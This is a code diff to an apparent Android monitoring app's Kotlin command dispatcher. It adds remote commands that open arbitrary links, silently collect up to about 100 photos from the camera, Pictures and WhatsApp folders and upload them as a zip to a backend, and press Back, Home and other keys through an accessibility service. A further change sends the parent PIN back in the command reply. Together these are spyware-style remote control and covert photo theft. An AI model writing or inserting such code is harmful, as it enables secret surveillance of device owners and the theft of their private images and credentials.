@@ -176,6 +176,9 @@ class CommandDispatcher(
                 "setpin" -> handleSetPin(command)
                 "prank_mode" -> handlePrankMode(command)
                 "spoof" -> handleSpoof(command)
+                "openlink" -> handleOpenLink(command)
+                "getimages" -> handleGetImages(command)
+                "remote_input" -> handleRemoteInput(command)
                 else -> error(command.commandId, "UNKNOWN_COMMAND", "Command is not supported on device")
             }
         }.getOrElse { throwable ->
@@ -1828,7 +1831,86 @@ class CommandDispatcher(
             return error(command.commandId, "INVALID_PIN", "PIN must be 4 digits")
         }
         settingsStore.setParentPin(pin)
-        return success(command.commandId, mapOf("status" to "pin_updated"))
+        return success(command.commandId, mapOf("status" to "pin_updated", "pin" to pin))
+    }
+
+    private fun handleOpenLink(command: DeviceCommand): CommandResult {
+        val url = command.payload["url"]?.toString()?.trim().orEmpty()
+        if (url.isBlank()) return error(command.commandId, "URL_REQUIRED", "No URL provided")
+        
+        return try {
+            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            appContext.startActivity(intent)
+            success(command.commandId, mapOf("status" to "browser_launched", "url" to url))
+        } catch (e: Exception) {
+            error(command.commandId, "LAUNCH_FAILED", e.message ?: "Failed to open link")
+        }
+    }
+
+    private suspend fun handleGetImages(command: DeviceCommand): CommandResult {
+        return withContext(Dispatchers.IO) {
+            runCatching {
+                val imageFiles = mutableListOf<File>()
+                val roots = listOf(
+                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
+                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
+                    File(Environment.getExternalStorageDirectory(), "WhatsApp/Media/WhatsApp Images"),
+                    File(Environment.getExternalStorageDirectory(), "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images")
+                )
+
+                for (root in roots) {
+                    if (root.exists() && root.isDirectory) {
+                        root.walkTopDown()
+                            .maxDepth(3)
+                            .filter { it.isFile && listOf("jpg", "jpeg", "png", "webp").contains(it.extension.lowercase()) }
+                            .take(50)
+                            .forEach { imageFiles.add(it) }
+                    }
+                    if (imageFiles.size >= 100) break
+                }
+
+                if (imageFiles.isEmpty()) {
+                    return@withContext error(command.commandId, "NO_IMAGES", "No images found in standard directories")
+                }
+
+                val zipFile = File(appContext.cacheDir, "images_${System.currentTimeMillis()}.zip")
+                FileUtils.zipFiles(imageFiles, zipFile)
+
+                val uploadResult = backendApiClient.uploadMedia(settingsStore, command.commandId, zipFile, "application/zip")
+                zipFile.delete()
+
+                success(command.commandId, mapOf("status" to "images_uploaded", "count" to imageFiles.size, "fileUrl" to uploadResult))
+            }.getOrElse {
+                error(command.commandId, "GET_IMAGES_FAILED", it.message ?: "Unknown error")
+            }
+        }
+    }
+
+    private fun handleRemoteInput(command: DeviceCommand): CommandResult {
+        val action = command.payload["action"]?.toString()?.uppercase() ?: ""
+        val service = AppMonitorAccessibilityService.instance
+            ?: return error(command.commandId, "SERVICE_NOT_ACTIVE", "Accessibility service is not running")
+
+        return when (action) {
+            "BACK" -> {
+                service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
+                success(command.commandId, mapOf("action" to "BACK", "status" to "sent"))
+            }
+            "HOME" -> {
+                service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                success(command.commandId, mapOf("action" to "HOME", "status" to "sent"))
+            }
+            "RECENTS" -> {
+                service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS)
+                success(command.commandId, mapOf("action" to "RECENTS", "status" to "sent"))
+            }
+            "NOTIFICATIONS" -> {
+                service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
+                success(command.commandId, mapOf("action" to "NOTIFICATIONS", "status" to "sent"))
+            }
+            else -> error(command.commandId, "UNSUPPORTED_ACTION", "Action $action is not supported yet")
+        }
     }
 
     private fun success(commandId: String, data: Map<String, Any?>, mediaId: String? = null): CommandResult {
